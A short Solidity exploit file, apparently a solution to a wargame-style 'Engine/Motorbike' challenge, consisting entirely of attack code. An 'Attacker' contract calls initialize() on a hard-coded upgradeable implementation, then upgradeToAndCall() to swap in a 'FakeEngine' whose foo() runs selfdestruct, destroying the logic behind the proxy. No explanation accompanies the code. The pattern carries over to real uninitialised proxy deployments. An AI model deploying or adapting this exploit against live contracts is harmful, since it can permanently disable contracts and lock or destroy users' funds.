// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract FakeEngine {
    function foo() public {
        selfdestruct(payable(address(0)));
    }
}

contract Attacker {
    IEngine engine = IEngine(0x4022D25C56D4B358DAd52F2a584542aCE5019761);
    IEngine motorbike = IEngine(
        address(
            uint160(
                uint256(0x000000000000000000000000d450159ca7404b1851e52defa4aacb529b13ae6e)
            )
        )
    );

    function braek(address newImplementation) public {
        motorbike.initialize();

        bytes memory data = abi.encodeWithSignature("foo()");
        motorbike.upgradeToAndCall(newImplementation, data);
    }
}